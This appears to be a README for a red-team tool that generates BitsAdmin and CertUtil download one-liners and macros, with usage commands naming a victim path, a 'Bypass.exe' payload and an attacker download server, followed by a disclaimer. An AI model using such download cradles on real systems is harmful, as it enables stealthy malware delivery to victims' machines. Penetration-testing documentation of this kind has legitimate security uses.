# BitsAdmin Payload Generator (BPG)
BPG is a Python-based tool designed to craft custom payloads for BitsAdmin, a legitimate Windows utility, to download files from a remote location. Additionally, BPG can generate a macro to utilize CertUtil, another built-in Windows tool, to facilitate the download process. This payload generator enables users to create a one-liner command that can be used to download a file via BitsAdmin and CertUtil, making it a useful tool for penetration testers, red teamers, and security researchers.


### Usage

To use the default web server port (80) you can use this command:
```
python3 bitsadmin.py -i 192.168.1.99 -j myJob -f file.txt -l 'C:\users\victim' -o enc.txt -exe Bypass.exe
```
Is your server running on a different port you can use this command:
```
python3 bitsadmin.py -i 192.168.1.99 -p 1234 -j myJob -f file.txt -l 'C:\users\victim' -o enc.txt -exe Bypass.exe
```
Start the bitsadmin-server with the following command so bitsadmin can download the fille.
```bash
python3 bitsadmin-server.py
```


### Disclaimer
BPG is a tool designed for legitimate purposes, such as penetration testing, red teaming, and security research. It should not be used for any illegal or unauthorized activities. Using BPG to download or distribute malicious files, or to compromise systems without permission, is strictly prohibited.

#### Consequences of Misuse
Misusing BPG can result in serious consequences, including but not limited to:
- Violation of applicable laws and regulations
- Civil and/or criminal penalties
- Damage to your reputation and credibility
- Harm to innocent parties

#### Limitation of Liability
The author and maintainer of BPG disclaim any responsibility for the actions of users who choose to misuse this tool. By using BPG, you acknowledge that you are solely responsible for your actions and the consequences that may result from them.

#### Ethical Use
BPG should only be used in accordance with applicable laws and regulations, and in a manner that is consistent with ethical guidelines and standards. If you are unsure about the legitimacy of your intended use, please consult with a qualified professional or seek guidance from a relevant authority.

By using BPG, you agree to these terms and acknowledge that you will use the tool responsibly and ethically.
